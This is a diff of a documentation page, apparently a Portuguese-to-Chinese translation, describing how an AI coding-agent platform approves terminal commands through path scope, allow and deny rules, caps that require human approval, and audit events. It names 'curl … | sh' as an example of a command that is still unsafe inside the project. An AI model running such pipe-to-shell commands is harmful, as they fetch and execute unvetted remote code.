+（<code>npm test</code>、<code>git status</code>、<code>mix test</code>、<code>npx vitest</code>），当它是一个非单词参数时只有动词（<code>cat src/x.ts</code> → <code>Terminal(cat)</code>，
+<code>cd ../lib</code> → <code>Terminal(cd)</code>），当第二个词元是 flag（<code>ls -la src</code>）或该单位会成为 RN-418 某个上限的前缀时则为<strong>精确</strong>片段
+（<code>git remote -v</code>、<code>gh pr list</code> 保持精确）。即使精确也是上限前缀的片段（单独的 <code>git</code>）不写入任何东西。<code>cd src/app && npm test</code> 写入
+<code>Terminal(cd)</code> 和 <code>Terminal(npm test)</code>，下一个
+<code>cd lib/core && npm test -- --coverage</code> 无需询问即可运行。匹配仍按词元前缀，上限仍在 <code>decide()</code> 中于文件之后运行，路径范围在自动模式之外仍然有效。模块 dev agent 的点击仍写入 <code>agent_autonomy</code>，而不是模式（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-509>RN-509</a>）。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=path-scope>路径范围<a href=#path-scope class=hash-link aria-label=路径范围的直接链接 title=路径范围的直接链接 translate=no>​</a></h2>
+<p><code>terminal</code> 命令还会按<strong>它触及何处</strong>来评估，而不只是按动词（<a class="" href=/brabo/dev/zh-Hans/adr/0055-escopo-de-caminho-na-politica-de-terminal>ADR 0055</a>，
+<a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-075>RN-075</a>）。项目文件夹——
+<code>&lt;PROJECT_WORKSPACES_ROOT>/&lt;workspace_dir_name></code>，<code>permissions.json</code> 和所有 agent 的 worktree 都在其中——就是<strong>范围</strong>。
 <code>workspace_dir_name</code>
-(<a href=/brabo/dev/zh-Hans/adr/0066-nome-de-pasta-legivel-do-workspace target=_blank rel="noopener noreferrer" class="">ADR 0066</a>,
-<a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-109 target=_blank rel="noopener noreferrer" class="">RN-109</a>) é o nome da pasta
-congelado na criação do projeto — legível (<code>&lt;slug>-&lt;8 caracteres do id></code>) num
-projeto novo, o UUID puro num projeto de antes dessa mudança.</p>
-<p><strong>Um projeto em modo <code>local</code> tem um escopo diferente, e a diferença importa
-aqui</strong> (<a href=/brabo/dev/zh-Hans/adr/0072-projeto-local-ou-container target=_blank rel="noopener noreferrer" class="">ADR 0072</a>,
-<a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-169 target=_blank rel="noopener noreferrer" class="">RN-169</a>/<a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-170 target=_blank rel="noopener noreferrer" class="">RN-170</a>):
-a raiz passa a ser o <strong>caminho absoluto que o usuário digitou na criação</strong>, não
-<code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>.</p>
-<p>Tudo o que esta seção descreve continua valendo — o escopo aperta e afrouxa
-exatamente do mesmo jeito, e <code>deny</code> continua vencendo primeiro. O que muda é o
-que ele CONTÉM. E a consequência é declarada sem atenuação no ADR 0072: a
-contenção <strong>estrutural</strong> do <code>join</code> — "o resultado nunca sai da raiz gerenciada,
-aconteça o que acontecer com a coluna" — deixa de existir para esses projetos.
-O que a substitui é a validação na criação (RN-170: absoluto, sem <code>..</code>,
-existente, gravável, nunca uma raiz de sistema, nunca sobreposto ao checkout do
-Brabo), mais a revalidação LÉXICA do mesmo predicado em toda derivação da raiz
-— para que uma linha adulterada direto no banco não vire um escopo de terminal
-em <code>/</code>.</p>
-<p>A comparação de caminho é <strong>léxica e sem regex sobre a entrada</strong>: aparar barras
-finais é uma varredura O(n), não <code>.replace(/\/+$/, '')</code>. O padrão antigo foi
-apontado pelo CodeQL como ReDoS polinomial (HIGH) — ele força o motor a tentar
-toda posição inicial, e degrada para O(n²) com muitas barras. A entrada aqui
-vem de um comando de agente, então não é lugar para regex com backtracking.</p>
-<p>O escopo faz duas coisas opostas, e é a combinação que importa:</p>
-<p><strong>Aperta.</strong> Um comando que toca um caminho de fora nunca é auto-aprovado, por
-mais que o verbo esteja no <code>allow</code>. Sem isso, um <code>Terminal(cat)</code> permitido
-auto-executaria <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — o código da
-plataforma que roda o agente — e alcançaria os worktrees de outros projetos.</p>
-<p><strong>Afrouxa.</strong> Dentro do escopo, <code>cd</code> deixa de ser verbo que precisa de
-permissão: ele é a própria declaração do escopo. Sem isso, o dev agent, que
-sempre emite <code>cd &lt;caminho> && &lt;verbo></code>, esbarraria na regra do comando
-composto — todo segmento precisa casar — e <strong>todo</strong> comando pararia para
-aprovação, por mais que o verbo estivesse permitido.</p>
-<p>Três limites que vale entender:</p>
+（<a class="" href=/brabo/dev/zh-Hans/adr/0066-nome-de-pasta-legivel-do-workspace>ADR 0066</a>，
+<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-109>RN-109</a>）是在项目创建时冻结的文件夹名——新项目中可读（<code>&lt;slug>-&lt;id 的 8 个字符></code>），这次变更之前的项目中是纯 UUID。</p>
+<p><strong><code>local</code> 模式的项目有不同的范围，这一差异在这里很重要</strong>（<a class="" href=/brabo/dev/zh-Hans/adr/0072-projeto-local-ou-container>ADR 0072</a>，
+<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-169>RN-169</a>/<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-170>RN-170</a>）：
+根变为<strong>用户在创建时键入的绝对路径</strong>，而不是
+<code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>。</p>
+<p>本节描述的一切依然有效——范围收紧和放松的方式完全相同，<code>deny</code> 依旧最先胜出。改变的是它<strong>包含</strong>什么。而后果在 ADR 0072 中被毫不淡化地声明：<code>join</code> 的<strong>结构性</strong>约束——“无论这一列发生什么，结果都不会离开受管根”——对这些项目不复存在。取而代之的是创建时的校验（RN-170：绝对路径、无 <code>..</code>、存在、可写、绝不是系统根、绝不与 Brabo 的 checkout 重叠），以及在每次派生根时对同一谓词的<strong>词法</strong>再校验——使数据库中被直接篡改的一行不会变成 <code>/</code> 上的终端范围。</p>
+<p>路径比较是<strong>词法的，且不对输入使用正则</strong>：去掉末尾斜杠是一次 O(n) 扫描，而不是 <code>.replace(/\/+$/, '')</code>。旧模式被 CodeQL 标记为多项式 ReDoS（HIGH）——它迫使引擎尝试每个起始位置，在大量斜杠时退化为 O(n²)。这里的输入来自 agent 的命令，因此不是使用带回溯正则的地方。</p>
+<p>范围做两件相反的事，重要的是二者的组合：</p>
+<p><strong>收紧。</strong> 触及外部路径的命令永远不会被自动批准，无论动词是否在 <code>allow</code> 中。没有这一点，一个被允许的 <code>Terminal(cat)</code> 会自动执行 <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code>——运行 agent 的平台代码——并触及其他项目的 worktree。</p>
+<p><strong>放松。</strong> 在范围之内，<code>cd</code> 不再是需要许可的动词：它本身就是范围的声明。没有这一点，总是发出 <code>cd &lt;caminho> && &lt;verbo></code> 的 dev agent 会撞上复合命令规则——每个片段都需要匹配——于是<strong>每个</strong>命令都会停下等待审批，无论动词是否被允许。</p>
+<p>值得理解的三个限制：</p>
 <ul>
-<li class=""><strong>Escopo permite, não isenta.</strong> Estar na pasta do projeto não torna
-<code>curl … | sh</code> seguro: um verbo fora do <code>allow</code> continua exigindo aprovação.</li>
-<li class=""><strong>Fora do escopo é <code>require_approval</code>, não <code>deny</code>.</strong> O agente pode ter um
-motivo legítimo para olhar fora; quem decide continua sendo você.</li>
-<li class=""><strong>O modo automático pula este teto.</strong> Um agente com a curinga
-<code>"*": auto_approve</code> roda comandos fora do escopo sem perguntar
-(<a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-603 target=_blank rel="noopener noreferrer" class="">RN-603</a>); voltar o card do
-agente para "manual" o restaura.</li>
-<li class=""><strong>A normalização é léxica, não <code>realpath</code>.</strong> <code>&lt;raiz>/../..</code> é resolvido e
-rejeitado; um link simbólico dentro do projeto apontando para fora <strong>não</strong> é
-detectado. Escopo é política, não isolamento.</li>
+<li class=""><strong>范围允许，而不豁免。</strong> 位于项目文件夹中并不会让
+<code>curl … | sh</code> 变得安全：不在 <code>allow</code> 中的动词仍需审批。</li>
+<li class=""><strong>范围之外是 <code>require_approval</code>，不是 <code>deny</code>。</strong> agent 可能有查看外部的正当理由；决定者仍然是你。</li>
+<li class=""><strong>自动模式跳过这一上限。</strong> 带有通配符
+<code>"*": auto_approve</code> 的 agent 会不经询问地运行范围外的命令
+（<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-603>RN-603</a>）；把 agent 卡片切回“手动”即可恢复。</li>
+<li class=""><strong>规范化是词法的，不是 <code>realpath</code>。</strong> <code>&lt;raiz>/../..</code> 会被解析并拒绝；项目内指向外部的符号链接<strong>不会</strong>被检测到。范围是策略，不是隔离。</li>
 </ul>
-<p>Quais tokens são conferidos: os <strong>absolutos</strong> (começam com <code>/</code>) e os que
-contêm <code>..</code>. Um relativo sem <code>..</code> resolve abaixo do <code>cwd</code>, que já foi conferido
-— e tratar <code>-maxdepth</code>, <code>4</code> ou <code>*.ex</code> como caminho rejeitaria um comando
-legítimo sem ganhar segurança nenhuma.</p>
-<p>Duas propriedades que decorrem disto:</p>
-<p><strong><code>deny</code> vence na hora.</strong> Não importa em que etapa apareça, ele devolve na
-hora. Não há configuração que reverta um <code>deny</code>.</p>
-<p><strong>Etapa calada nunca rebaixa.</strong> Se o <code>agent_autonomy</code> disse <code>auto_approve</code> e o
-<code>permissions.json</code> não tem regra para aquela ação, o resultado continua
-<code>auto_approve</code> — o arquivo não "vota contra" por omissão. Cada etapa só pode
-subir a permissividade da anterior.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=caps>Tetos<a href=#caps class=hash-link aria-label=Tetos的直接链接 title=Tetos的直接链接 translate=no>​</a></h2>
-<p>Aplicados <strong>por último</strong>, depois de todo o resto:</p>
+<p>检查哪些词元：<strong>绝对</strong>的（以 <code>/</code> 开头）以及包含 <code>..</code> 的。不含 <code>..</code> 的相对路径解析在已检查过的 <code>cwd</code> 之下——而把 <code>-maxdepth</code>、<code>4</code> 或 <code>*.ex</code> 当作路径会拒绝合法命令，却不带来任何安全收益。</p>
+<p>由此得出两个属性：</p>
+<p><strong><code>deny</code> 立即胜出。</strong> 无论出现在哪一步，它都会立即返回。没有任何配置能逆转 <code>deny</code>。</p>
+<p><strong>沉默的步骤从不降级。</strong> 如果 <code>agent_autonomy</code> 说 <code>auto_approve</code> 而
+<code>permissions.json</code> 对该动作没有规则，结果仍是
+<code>auto_approve</code>——文件不会因省略而“投反对票”。每一步只能提高前一步的放行程度。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=caps>上限<a href=#caps class=hash-link aria-label=上限的直接链接 title=上限的直接链接 translate=no>​</a></h2>
+<p><strong>最后</strong>应用，在其余一切之后：</p>
 
 
 
@@ -644,63 +415,32 @@ subir a permissividade da anterior.</p>
 
 
 
-<table><thead><tr><th>teto<th>efeito<th>por quê<tbody><tr><td><code>git_merge</code> com destino em <code>dev</code>, <code>qa</code>, <code>rc</code> ou <code>main</code><td><code>auto_approve</code> → <code>require_approval</code><td>merge em branch protegida é sempre decisão sua (<a href=/brabo/dev/zh-Hans/business-rules#rn-006 target=_blank rel="noopener noreferrer" class="">RN-006</a>)<tr><td><code>instruction_patch</code><td><code>auto_approve</code> → <code>require_approval</code><td>você precisa ver o diff antes de um agente mudar o comportamento de outro (<a href=/brabo/dev/zh-Hans/business-rules#rn-007 target=_blank rel="noopener noreferrer" class="">RN-007</a>)<tr><td><code>parallelize</code> e <code>raise_max_parallel</code><td><code>auto_approve</code> → <code>require_approval</code><td>gastar com mais agentes é decisão sua; sem este teto o limite do lead seria decorativo, e subir o próprio teto seria o produto subindo o próprio limite de gasto (<a href=/brabo/dev/zh-Hans/business-rules/custo#rn-086 target=_blank rel="noopener noreferrer" class="">RN-086</a>)<tr><td><code>terminal</code> com git de efeito externo (push/PR/deploy) ou <code>sudo</code>/<code>doas</code><td><code>auto_approve</code> → <code>require_approval</code><td>git com efeito externo e comandos privilegiados nunca são auto-aprováveis, nem com o "modo automático" ligado (<a href=/brabo/dev/zh-Hans/business-rules#rn-418 target=_blank rel="noopener noreferrer" class="">RN-418</a>, revisa a <a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-106 target=_blank rel="noopener noreferrer" class="">RN-106</a>) — veja a seção dedicada acima<tr><td><code>git_push</code> e <code>pr_open</code> tipados<td><code>auto_approve</code> → <code>require_approval</code><td>o mesmo teto da RN-418 pela porta tipada: nem a curinga do modo automático, nem uma regra específica de <code>agent_autonomy</code>, nem o <code>permissions.json</code> os promovem (<a href=/brabo/dev/zh-Hans/business-rules#rn-689 target=_blank rel="noopener noreferrer" class="">RN-689</a>). <code>git_merge</code> mantém o teto próprio (primeira linha); <code>deploy</code> não é tipo de <code>proposed_action</code><tr><td><code>container_remove</code><td><code>auto_approve</code> → <code>require_approval</code><td>descartar um container força um reprovisionamento completo — mesmo calibre de mergear em branch protegida, decidido toda vez, nunca configurado uma vez (<a href=/brabo/dev/zh-Hans/business-rules#rn-495 target=_blank rel="noopener noreferrer" class="">RN-495</a>)</table>
-<p>Um teto rebaixa <code>auto_approve</code> para <code>require_approval</code>; ele <strong>não</strong> transforma
-<code>deny</code> em outra coisa, porque o <code>deny</code> já teria devolvido antes.</p>
-<p>:::note Por que <code>rc</code> continua na lista</p>
-<p>O degrau <code>rc</code> saiu da política de branches
-(<a href=/brabo/dev/zh-Hans/adr/0030-politica-de-branches-mecanizada target=_blank rel="noopener noreferrer" class="">ADR 0030</a>) e o bootstrap
-parou de criá-lo (<a href=/brabo/dev/zh-Hans/business-rules#rn-029 target=_blank rel="noopener noreferrer" class="">RN-029</a>) — mas ele continua
-aqui, em <code>domain/actions/protected-branches.ts</code>.</p>
-<p>Esta lista decide o que a trava de merge <strong>recusa</strong>, e repositórios
-bootstrapados por versões anteriores do Brabo ainda têm a branch. Tirá-la daqui
-não tiraria nada do repositório de ninguém: só tornaria auto-aprovável um
-<code>git_merge</code> com destino <code>rc</code>, numa branch que alguém pode estar usando como
-produção.</p>
-<p>Proteger uma branch que não existe não custa nada. Desproteger uma que existe
-custa caro — e a assimetria é deliberada.</p>
+<table><thead><tr><th>上限<th>效果<th>原因<tbody><tr><td>目标为 <code>dev</code>、<code>qa</code>、<code>rc</code> 或 <code>main</code> 的 <code>git_merge</code><td><code>auto_approve</code> → <code>require_approval</code><td>合并到受保护 branch 始终是你的决定（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-006>RN-006</a>）<tr><td><code>instruction_patch</code><td><code>auto_approve</code> → <code>require_approval</code><td>在一个 agent 改变另一个 agent 的行为之前，你需要看到 diff（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-007>RN-007</a>）<tr><td><code>parallelize</code> 和 <code>raise_max_parallel</code><td><code>auto_approve</code> → <code>require_approval</code><td>在更多 agent 上花钱是你的决定；没有这一上限，lead 的限制就是装饰，而提高自己的上限就是产品在提高自己的支出限额（<a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-086>RN-086</a>）<tr><td>带有外部效果 git（push/PR/deploy）或 <code>sudo</code>/<code>doas</code> 的 <code>terminal</code><td><code>auto_approve</code> → <code>require_approval</code><td>有外部效果的 git 和特权命令永远不可自动批准，即使开启了“自动模式”（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-418>RN-418</a>，修订 <a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-106>RN-106</a>）——见上方专门一节<tr><td>有类型的 <code>git_push</code> 和 <code>pr_open</code><td><code>auto_approve</code> → <code>require_approval</code><td>经由有类型入口的同一个 RN-418 上限：无论是自动模式的通配符、<code>agent_autonomy</code> 的具体规则，还是 <code>permissions.json</code>，都不会提升它们（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-689>RN-689</a>）。<code>git_merge</code> 保留自己的上限（第一行）；<code>deploy</code> 不是 <code>proposed_action</code> 的类型<tr><td><code>container_remove</code><td><code>auto_approve</code> → <code>require_approval</code><td>丢弃容器会强制完全重新配置——与合并到受保护 branch 同一量级，每次都要决定，绝不一次性配置（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-495>RN-495</a>）</table>
+<p>上限把 <code>auto_approve</code> 降为 <code>require_approval</code>；它<strong>不会</strong>把
+<code>deny</code> 变成别的东西，因为 <code>deny</code> 早已提前返回。</p>
+<p>:::note 为什么 <code>rc</code> 仍在列表中</p>
+<p><code>rc</code> 这一级已从 branch 策略中移除
+（<a class="" href=/brabo/dev/zh-Hans/adr/0030-politica-de-branches-mecanizada>ADR 0030</a>），bootstrap
+也不再创建它（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-029>RN-029</a>）——但它仍在这里，在 <code>domain/actions/protected-branches.ts</code> 中。</p>
+<p>这个列表决定合并锁<strong>拒绝</strong>什么，而由早期版本 Brabo bootstrap 的仓库仍有这个 branch。从这里移除它不会从任何人的仓库中移除任何东西：只会让以 <code>rc</code> 为目标的
+<code>git_merge</code> 变得可自动批准，而这个 branch 可能正被某人用作生产。</p>
+<p>保护一个不存在的 branch 没有成本。取消保护一个存在的 branch 代价高昂——这种不对称是有意的。</p>
 <p>:::</p>
-<p>A diferença entre teto e padrão: o padrão é o que acontece quando ninguém
-configurou nada; o teto é o que acontece <strong>independentemente</strong> do que foi
-configurado.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem>O que acontece com o agente enquanto a decisão não vem<a href=#o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem class=hash-link aria-label="O que acontece com o agente enquanto a decisão não vem的直接链接" title="O que acontece com o agente enquanto a decisão não vem的直接链接" translate=no>​</a></h2>
-<p>Uma ação <code>pending</code> não é só uma linha esperando um clique: do outro lado há um
-agente parado.</p>
-<p>Quando a ferramenta que ele chamou fica pendente, o laço dele <strong>suspende</strong>,
-segurando a tarefa, o worktree e o histórico da conversa, e ele entra em
-<code>awaiting_approval</code>. A sua decisão emite <code>task.action_settled</code>, que o acorda:
-o resultado real do comando ocupa o lugar onde estaria a resposta, e o laço
-retoma de onde parou.</p>
-<p><strong>Recusar também responde.</strong> O motivo ocupa o lugar do resultado, e o agente
-aprende que aquele caminho está fechado em vez de esperar para sempre — negar
-não o deixa travado.</p>
-<p>Isso importa para quem opera: aprovar tarde não desperdiça o trabalho já
-feito, e a fila de aprovação não é assíncrona por conveniência — ela é
-literalmente o que o agente está esperando. Antes disso, <code>pending</code> voltava
-como se fosse a resposta do comando, e o agente queimava o teto de iterações
-tentando outra coisa até a tarefa morrer sem uma linha escrita
-(<a href=/brabo/dev/zh-Hans/business-rules/custo#rn-073 target=_blank rel="noopener noreferrer" class="">RN-073</a>).</p>
-<p><strong>Com uma exceção: reinício do engine.</strong> O laço suspenso mora em memória,
-então um reinício o derruba junto. Nesse caso a tarefa <strong>não</strong> fica esperando:
-ela volta para a fila de bloqueadas, com o motivo e origem <code>infra</code> no event
-log, e uma decisão tomada depois disso não tem mais onde ser aplicada — a ação
-decidida fica registrada, mas o turno que a esperava não existe mais. Se você
-aprovou e nada aconteceu, este é o primeiro lugar a olhar.</p>
-<p>A auto-aprovação não passa por aqui: ela executa na proposta e o resultado
-volta no mesmo turno — que é exatamente o valor de ter os padrões da seção
-anterior.</p>
-<p><strong>O Dev Lead suspende do mesmo jeito, com uma diferença no reinício</strong>
-(ADR 0086, <a href=/brabo/dev/zh-Hans/business-rules#rn-284 target=_blank rel="noopener noreferrer" class="">RN-284</a>). Ele é conversacional, não
-tem worktree nem tarefa — o que suspende é o <code>handle_call</code> síncrono do turno,
-via <code>agent.status: awaiting_approval</code>. Diferente do dev agent, ele NÃO tem fila
-para onde voltar num reinício do engine: a decisão continua registrada e
-visível em Aprovações, mas o Dev Lead não narra o desfecho sozinho — o processo
-que esperava morreu, e o próximo reinício sobe um Dev Lead novo, sem inscrição
-para aquela ação. Uma lacuna aceita e declarada, não disfarçada.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-que-é-gravado-em-cada-decisão>O que é gravado em cada decisão<a href=#o-que-é-gravado-em-cada-decisão class=hash-link aria-label="O que é gravado em cada decisão的直接链接" title="O que é gravado em cada decisão的直接链接" translate=no>​</a></h2>
-<p>Toda ação proposta e toda decisão sobre ela viram um <strong>evento de domínio</strong> em
-<code>session_events</code>, com o ator real
-(<a href=/brabo/dev/zh-Hans/business-rules/custo#rn-049 target=_blank rel="noopener noreferrer" class="">RN-049</a>):</p>
+<p>上限与默认值的区别：默认值是没有人配置任何东西时发生的事；上限是<strong>无论</strong>配置了什么都会发生的事。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=决定未到时-agent-发生什么>决定未到时 agent 发生什么<a href=#决定未到时-agent-发生什么 class=hash-link aria-label="决定未到时 agent 发生什么的直接链接" title="决定未到时 agent 发生什么的直接链接" translate=no>​</a></h2>
+<p><code>pending</code> 动作不只是一行在等待点击：另一端有一个停住的 agent。</p>
+<p>当它调用的工具处于待处理时，它的循环<strong>挂起</strong>，保留任务、worktree 和对话历史，并进入
+<code>awaiting_approval</code>。你的决定发出 <code>task.action_settled</code>，将它唤醒：命令的真实结果占据回答本应所在的位置，循环从停下处继续。</p>
+<p><strong>拒绝也是回答。</strong> 原因占据结果的位置，agent 得知那条路已关闭，而不是永远等待——拒绝不会让它卡住。</p>
+<p>这对运维者很重要：迟些批准不会浪费已完成的工作，审批队列也不是为了方便才异步——它就是 agent 字面上在等待的东西。在此之前，<code>pending</code> 会被当作命令的回答返回，agent 会烧掉迭代上限去尝试别的东西，直到任务在一行未写的情况下死去
+（<a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-073>RN-073</a>）。</p>
+<p><strong>有一个例外：engine 重启。</strong> 挂起的循环位于内存中，因此重启会把它一并带走。这种情况下任务<strong>不会</strong>继续等待：它回到被阻塞队列，事件日志中有原因和来源 <code>infra</code>，此后做出的决定不再有地方应用——已决定的动作被记录，但等待它的轮次已不存在。如果你批准了而什么都没发生，这里是首先要看的地方。</p>
+<p>自动批准不经过这里：它在提案时执行，结果在同一轮次中返回——这正是拥有上一节那些模式的价值所在。</p>
+<p><strong>Dev Lead 以同样方式挂起，但在重启时有一处不同</strong>
+（ADR 0086，<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-284>RN-284</a>）。它是对话型的，没有 worktree 也没有任务——挂起的是轮次的同步 <code>handle_call</code>，经由 <code>agent.status: awaiting_approval</code>。与 dev agent 不同，它在 engine 重启时<strong>没有</strong>可以回去的队列：决定仍被记录并在“审批”中可见，但 Dev Lead 不会自己讲述结果——等待的进程已死，下一次重启会启动一个新的 Dev Lead，没有对该动作的订阅。这是一个被接受并声明的缺口，而非掩饰。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=每次决定记录什么>每次决定记录什么<a href=#每次决定记录什么 class=hash-link aria-label=每次决定记录什么的直接链接 title=每次决定记录什么的直接链接 translate=no>​</a></h2>
+<p>每个提出的动作以及对它的每个决定都会成为 <code>session_events</code> 中的一个<strong>领域事件</strong>，带有真实的行动者
+（<a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-049>RN-049</a>）：</p>
 
 
 
@@ -736,37 +476,18 @@ para aquela ação. Uma lacuna aceita e declarada, não disfarçada.</p>
 
 
 
-<table><thead><tr><th>evento<th>ator<th>quando<tbody><tr><td><code>proposed_action.created</code><td>o <strong>agente</strong> que a propôs<td>sempre, antes de qualquer execução. <code>payload.status</code> diz como a ação nasceu: <code>pending</code>, <code>auto_approved</code> ou <code>denied</code>; <code>payload.reason</code> diz qual regra de <code>decide()</code> a produziu (<a href=/brabo/dev/zh-Hans/business-rules#rn-567 target=_blank rel="noopener noreferrer" class="">RN-567</a>)<tr><td><code>proposed_action.approved</code><td>o <strong>usuário</strong> que clicou<td>só na aprovação manual (inclusive <code>approve_always</code>)<tr><td><code>permission.granted</code><td>o <strong>usuário</strong> que clicou em "sempre permitir"<td>só quando o clique gravou de fato um padrão — <code>payload.patterns</code> (os padrões gravados, um por segmento, <a href=/brabo/dev/zh-Hans/business-rules#rn-675 target=_blank rel="noopener noreferrer" class="">RN-675</a>) e <code>payload.pattern</code> (a mesma lista unida por ", "), ou <code>payload.agentId</code>/<code>actionType</code> para um dev agent de módulo (<a href=/brabo/dev/zh-Hans/business-rules#rn-642 target=_blank rel="noopener noreferrer" class="">RN-642</a>)<tr><td><code>proposed_action.denied</code><td>o <strong>usuário</strong> que recusou<td>com <code>payload.reason</code><tr><td><code>action.executed</code> / <code>action.failed</code><td><code>system</code><td>desfecho da execução</table>
-<p>Daí sai o único jeito confiável de separar as duas coisas que este documento
-descreve:</p>
+<table><thead><tr><th>事件<th>行动者<th>何时<tbody><tr><td><code>proposed_action.created</code><td>提出它的 <strong>agent</strong><td>总是，在任何执行之前。<code>payload.status</code> 说明动作如何诞生：<code>pending</code>、<code>auto_approved</code> 或 <code>denied</code>；<code>payload.reason</code> 说明是 <code>decide()</code> 的哪条规则产生了它（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-567>RN-567</a>）<tr><td><code>proposed_action.approved</code><td>点击的<strong>用户</strong><td>仅在手动批准时（包括 <code>approve_always</code>）<tr><td><code>permission.granted</code><td>点击“始终允许”的<strong>用户</strong><td>仅当这次点击确实写入了模式——<code>payload.patterns</code>（写入的模式，每个片段一个，<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-675>RN-675</a>）和 <code>payload.pattern</code>（同一列表以 ", " 连接），或对模块 dev agent 为 <code>payload.agentId</code>/<code>actionType</code>（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-642>RN-642</a>）<tr><td><code>proposed_action.denied</code><td>拒绝的<strong>用户</strong><td>带 <code>payload.reason</code><tr><td><code>action.executed</code> / <code>action.failed</code><td><code>system</code><td>执行的结果</table>
+<p>由此得出区分本文所描述两件事的唯一可靠方法：</p>
 <ul>
-<li class=""><strong>decisão humana</strong> = contar eventos <code>proposed_action.approved</code>;</li>
-<li class=""><strong>decisão de política</strong> = <code>proposed_action.created</code> com <code>status: auto_approved</code> e ator agente. Ela nunca produz um <code>.approved</code>, e por isso
-nunca se confunde com um clique. O <code>reason</code> dela diz <strong>qual</strong> regra
-auto-aprovou — <code>agent_autonomy: auto_approve</code>, uma linha <code>allow</code> do
-<code>permissions.json</code>, o piso do container, <code>escopo: cd dentro da pasta do projeto</code> — no texto exato que <code>decide()</code> usa. Eventos gravados antes da
-<a href=/brabo/dev/zh-Hans/business-rules#rn-567 target=_blank rel="noopener noreferrer" class="">RN-567</a> não têm <code>reason</code>: leia isso como "não
-registrado", não como "nenhuma regra". O motivo nomeia a regra, não a raiz
-do escopo; desde a <a href=/brabo/dev/zh-Hans/business-rules#rn-609 target=_blank rel="noopener noreferrer" class="">RN-609</a> o evento de uma ação
-<code>terminal</code> leva também <code>scopeRoot</code> — o modo de execução mais um
-identificador RELATIVO da raiz contra a qual o escopo de caminho comparou (o
-<code>workspace_dir_name</code> em <code>container</code>/<code>runner</code>, o segmento abaixo de
-<code>BRABO_PROJECTS_BASE</code> em <code>mounted</code>), nunca o caminho absoluto, que exporia o
-<code>$HOME</code> do usuário a todo membro. A linha do outbox não leva nem <code>reason</code> nem
-<code>scopeRoot</code> — nenhum consumidor do engine os lê. Desde a
-<a href=/brabo/dev/zh-Hans/business-rules#rn-614 target=_blank rel="noopener noreferrer" class="">RN-614</a> a tela mostra os dois, numa frase
-montada por uma função só: na linha do evento no painel de log da sessão e no
-card de aprovação (chat da sessão e fila da aba Aprovações). Um evento mais
-antigo diz "não registrado", e o card diz isso quando o evento está fora dos
-eventos carregados naquela tela.</li>
+<li class=""><strong>人的决定</strong> = 统计 <code>proposed_action.approved</code> 事件；</li>
+<li class=""><strong>策略的决定</strong> = <code>status: auto_approved</code> 且行动者为 agent 的 <code>proposed_action.created</code>。它从不产生 <code>.approved</code>，因此从不与点击混淆。它的 <code>reason</code> 说明是<strong>哪条</strong>规则自动批准的——<code>agent_autonomy: auto_approve</code>、<code>permissions.json</code> 的一行 <code>allow</code>、容器下限、<code>escopo: cd dentro da pasta do projeto</code>——采用 <code>decide()</code> 使用的确切文本。在
+<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-567>RN-567</a> 之前写入的事件没有 <code>reason</code>：请将其理解为“未记录”，而不是“没有规则”。原因点名的是规则，而不是范围的根；自 <a class="" href=/brabo/dev/zh-Hans/business-rules#rn-609>RN-609</a> 起，<code>terminal</code> 动作的事件还带有 <code>scopeRoot</code>——执行模式加上路径范围所比较的根的一个<strong>相对</strong>标识（<code>container</code>/<code>runner</code> 中为
+<code>workspace_dir_name</code>，<code>mounted</code> 中为
+<code>BRABO_PROJECTS_BASE</code> 之下的片段），绝不是绝对路径，后者会把用户的
+<code>$HOME</code> 暴露给每个成员。outbox 的行既不带 <code>reason</code> 也不带
+<code>scopeRoot</code>——engine 的任何消费者都不读取它们。自
+<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-614>RN-614</a> 起，界面显示两者，组成一句由单一函数构造的话：在会话日志面板的事件行中，以及在审批卡片中（会话聊天和“审批”标签页的队列）。较旧的事件显示“未记录”，当事件不在该界面已加载的事件中时，卡片也会这样显示。</li>
 </ul>
-<p>Isso não era verdade até a Fase 12e. As três primeiras linhas iam <strong>só para o
-outbox</strong>, que é transporte — drenado, marcado com <code>processed_at</code> e podado — e
-a decisão sobrevivia só em <code>proposed_actions.decided_at</code>, uma coluna fora da
-timeline que a tela, o Psicólogo e a Anamnese leem. O resultado prático foi
-que "quantas vezes o humano aprovou" não pôde ser respondido no dogfooding da
-Fase 10, que era exatamente a métrica principal daquele experimento.</p>
